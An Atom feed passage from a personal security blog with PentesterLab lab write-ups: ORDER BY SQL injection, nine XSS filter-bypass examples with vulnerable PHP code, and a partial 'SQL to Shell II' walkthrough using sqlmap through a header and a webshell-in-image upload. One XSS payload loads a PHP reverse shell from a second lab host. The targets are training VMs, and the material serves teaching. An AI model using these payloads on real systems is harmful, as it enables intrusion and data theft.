</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">ORDER</span> <span class="nx">BY</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">order</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]);</span>
</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Thanks to there is no back-tick (`), we have more options to exploit &ldquo;ORDER BY&rdquo; injection. rather than time-based blind injection, we can use <a href="http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html#function_if">IF function</a> to construct error-based injection here.</p>

<p>PoC:</p>

<p>// the page will order by name, it means the first character of database() is &lsquo;e&rsquo;
<code>http://10.10.10.129/sqli/example9.php?order=if((ASCII(substring(database(),1,1))=101),name,age)</code></p>

<p>// the page will order by age, it means the first character of database() is not &lsquo;f&rsquo;
<code>http://10.10.10.129/sqli/example9.php?order=if((ASCII(substring(database(),1,1))=102),name,age)</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example9.php?order=id" --dbs --batch</code></p>

<p>To be continued&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - XSS]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss/"/>
    <updated>2015-05-21T07:11:45-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>

<p>Due to this is quite a long course, I have to divide the course into several parts and this one is focus on Cross Site Script attack which is well known as XSS. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 1 / 5</p>

<!-- more -->


<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">    echo $_GET[&amp;ldquo;name&amp;rdquo;];</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>There is no input validation, so I can exploit it directly with the classic &ldquo;<font color="red"><em>alert(1)</em></font>&rdquo; injection.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example1.php?name=&lt;script&gt;alert(1);&lt;/script&gt;</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">    $name =  $_GET[&amp;ldquo;name&amp;rdquo;];</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&lt;script&gt;/&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&amp;lt;\/script&gt;/&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">echo $name;</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, the developer filtered <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. This is a sort of black list technique but only avoid one very specific situation. It can be bypassed easily by using upper letters or recursion. for example, both <code>&lt;sCript&gt;alert(1)&lt;/sCript&gt;</code> and <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code> are working perfectly.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example2.php?name=&lt;sCript&gt;alert(1)&lt;/sCript&gt;</code></p>

<p><code>http://10.10.10.129/xss/example2.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>

<h2>Example 3</h2>

<p>Code review:
<figure class='code'><figcaption><span>example3.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">    $name =  $_GET[&amp;ldquo;name&amp;rdquo;];</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&lt;script&gt;/i&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&amp;lt;\/script&gt;/i&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">echo $name;</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer use PCRE modifier &ldquo;i&rdquo; (<em>PCRE_CASELESS</em>) to match both upper and lower case letters. However, recursion method still works fine.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>

<h2>Example 4</h2>

<p><figure class='code'><figcaption><span>example4.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">script</span><span class="o">/</span><span class="nx">i</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">error</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;Hello &amp;lt;?php  echo $_GET[&amp;ldquo;name&amp;rdquo;]; ?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;&lt;br/&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the script will stop when &ldquo;<em>script</em>&rdquo; is detected, so the previous methods will not work any more. However there are plenty of methods available in HTML to trigger an event without &ldquo;<em>script</em>&rdquo;, there are two examples as follow.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example4.php?name=&lt;img src="xxxx" onerror="alert(1)"&gt;</code></p>

<p><code>http://10.10.10.129/xss/example4.php?name=&lt;div onmousemove="alert(1)" src="xxxx"&gt;</code></p>

<p>There are more <a href="http://www.w3schools.com/tags/ref_eventattributes.asp">event triggers</a> available in HTML.</p>

<h2>Example 5</h2>

<p>Code review:
<figure class='code'><figcaption><span>example5.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">alert</span><span class="o">/</span><span class="nx">i</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">error</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;Hello &amp;lt;?php  echo $_GET[&amp;ldquo;name&amp;rdquo;]; ?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer filtered keyword &ldquo;<em>alert</em>&rdquo;, obviously there are many methods to exploit the vulnerability without using &ldquo;<em>alert</em>&rdquo; function.
such as:</p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;iframe width=0 height=0 src="http://10.10.10.131/sh5555.php"&gt;</code></p>

<p>Here <strong><em>sh5555.php</em></strong> is PHP reverse shell (php/reverse_php, LPORT is 5555) generated by msfpayload.</p>

<p>Still, there are methods to bypass input validation to use &ldquo;<em>alert</em>&rdquo; function.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</code></p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;confirm(1)&lt;/script&gt;</code></p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>

<h2>Example 6</h2>

<p><figure class='code'><figcaption><span>example6.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">    var $a= &quot;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;;</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;&lt;code&gt;&amp;lt;?php require_once &#39;../footer.php&#39;; ?&amp;gt;</span>
</span><span class='line'><span class="x">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time user input has been included in &ldquo;<code>&lt;script&gt;</code>&rdquo; tab, so we do not need input &ldquo;<code>&lt;script&gt;</code>&rdquo; and just close the first double quote and use &ldquo;//&rdquo; to comment the following strings.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example6.php?name=";alert(1);//</code></p>

<h2>Example 7</h2>

<p><figure class='code'><figcaption><span>example7.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">    var $a= &#39;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&#39;;</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer use PHP function &ldquo;<em><a href="http://php.net/htmlentities">htmlentities()</a></em>&rdquo; to deal with user input, the &ldquo;<em>htmlentities()</em>&rdquo; function will encode special characters which will break the XSS injection. However, the developer did not indicate any flags to function &ldquo;<em>htmlentities()</em>&rdquo; which default only use flags &ldquo;<strong>ENT_COMPAT | ENT_HTML401</strong>&rdquo;, &ldquo;<a href="http://php.net/htmlentities">ENT_COMPAT</a>&rdquo; flag only convert double quotes and leave single quotes alone. So in this case, the following payload will work fine:</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example7.php?name=';alert(1);//</code></p>

<h2>Example 8</h2>

<p><figure class='code'><figcaption><span>example8.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">HELLO</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&amp;ldquo; method=&quot;POST&amp;rdquo;&gt;</span>
</span><span class='line'><span class="x">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span>
</span><span class='line'><span class="x">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php</span>
</span><span class='line'><span class="x">  require_once &amp;lsquo;../footer.php&amp;rsquo;;</span>
</span><span class='line'><span class="x">?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer did correct validation on parameter &ldquo;<em>name</em>&rdquo;, but the problem happened on &ldquo;<em>$_SERVER[PHP_SELF]</em>&rdquo;.
Due to there is no validation on parameter &ldquo;<strong><a href="http://php.net/manual/en/reserved.variables.server.php">PHP_SELF</a></strong>&rdquo; which is controlled by user, I still can inject XSS and exploit the vulnerability.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example8.php/" onmouseover="alert(1)</code></p>

<h2>Example 9</h2>

<p><figure class='code'><figcaption><span>example9.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">  document.write(location.hash.substring(1));</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time is <a href="https://www.owasp.org/index.php/DOM_Based_XSS">DOM-based XSS</a>. the user input is in URL after &ldquo;#&rdquo;, so just put payload after &ldquo;#&rdquo; in URL will trigger the vulnerability.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>

<p>Reference:</p>

<p>[1] <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#HTML_entities"><em>XSS Filter Evasion Cheat Sheet</em></a></p>

<p>To be continued&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] From SQL to Shell II]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/12/pentesterlab-from-sql-to-shell-ii/"/>
    <updated>2015-05-12T06:33:13-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/12/pentesterlab-from-sql-to-shell-ii</id>
    <content type="html"><![CDATA[<p>This is an upgraded version from previous course &ldquo;<a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell'>From SQL Injection to Shell</a>&rdquo; which is talking about how to exploit basic error-based SQL injection vulnerability, in this course &ldquo;From SQL Injection to Shell II&rdquo;, more advanced techniques will be used to exploit complicated Blind-SQL injection vulnerability.</p>

<p>More information and ISO download please check <a href='https://ptl.io/from_sqli_to_shell_II_i386.iso'>here</a>. The <a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell_II/course'>official course</a> is highly recommended to read, which explains how the vulnerabilities happened and the ways to exploit.</p>

<p>Difficulty: 3 / 5</p>

<h2>Links</h2>


<p>watch video online:
<iframe src='http://player.vimeo.com/video/127586134?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Interacted with the web server, found the it is Nginx server and also found admin login page. [Firefox]</li>
<li>Use sqlmap to test and exploit the blind-SQL injection vulnerability which is happened in HTTP header &#8220;X-Forwarded-for&#8221;. [sqlmap]</li>
<li>In order to bypass the file validation to upload php webshell, the attacker use exiftool to store php code hidden in a real jpg image. [exiftool]</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://sqlmap.org/'>sqlmap</a></li>
<li><a href='http://www.sno.phy.queensu.ca/~phil/exiftool/'>exiftool</a></li>
</ul>


<h2>Walkthrough</h2>


<p>By reading the official course <a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell_II/course'>pdf</a>, we know that we need to find and exploit a blind SQL injection vulnerability to dump and crack the web admin&rsquo;s password. After login to the dashboard, we need to find a way to bypass file validation function and upload image with php webshell.</p>

<h3>Detect and Exploit Blind SQL injection in HTTP header &#8216;X-Forwarded-for&#8217;</h3>


<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. When the web page has been loaded, my firefox addon &ldquo;<a href='https://wappalyzer.com/'>wappalyzer</a>&rdquo; show the web server is <a href='http://nginx.org/en/'>Nginx</a> (which has mis-configuration vulnerability will be used later to interpret image file as PHP). Also there is &ldquo;Admin&rdquo; link will access to admin dashboard login page.</p>

<p>Next the attacker uses SQLMAP to detect and exploit the blind SQL injection.</p>

<p>1st detect and fetch all the databases from the server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u &ldquo;&lt;a href="http://10.10.10.129/">http://10.10.10.129/&lt;/a>&rdquo; &ndash;headers=&ldquo;X-forwarded-for:1*&rdquo; &ndash;dbs</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/fromsqltoshell2/1.png"></p>

<p>2nd fetch all the tables belong to database &ldquo;photoblog&rdquo;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u &ldquo;&lt;a href="http://10.10.10.129/">http://10.10.10.129/&lt;/a>&rdquo; &ndash;headers=&ldquo;X-forwarded-for:1*&rdquo; &ndash;tables -D photoblog &ndash;smart &ndash;batch</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/fromsqltoshell2/2.png"></p>

<p>3rd dump table &ldquo;user&rdquo;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u &ldquo;&lt;a href="http://10.10.10.129/">http://10.10.10.129/&lt;/a>&rdquo; &ndash;headers=&ldquo;X-forwarded-for:1*&rdquo; &ndash;dump -T users -D photoblog &ndash;smart &ndash;batch</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/fromsqltoshell2/3.png"></p>

<p>Here we can see that login username is &ldquo;<font color='red'>admin</font>&rdquo; and password is &ldquo;<font color='red'>P4ssw0rd</font>&rdquo;</p>

<p>After login to the dashboard, there is file upload function (the URL is <a href="http://10.10.10.129/admin/new.php">http://10.10.10.129/admin/new.php</a>)</p>

<p>After many times Trail and error, I found the only real image (.png, .jpg and .gif) with correct content can be uploaded, then the image file will be renamed and saved in &ldquo;/admin/uploads/&rdquo;.</p>

<p>However, Nginx has a mis-configure vulnerability which can be exploited to make the shell executed.</p>

<p>In order to test if the target server has the mis-configure vulnerability, I tried the following commands:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
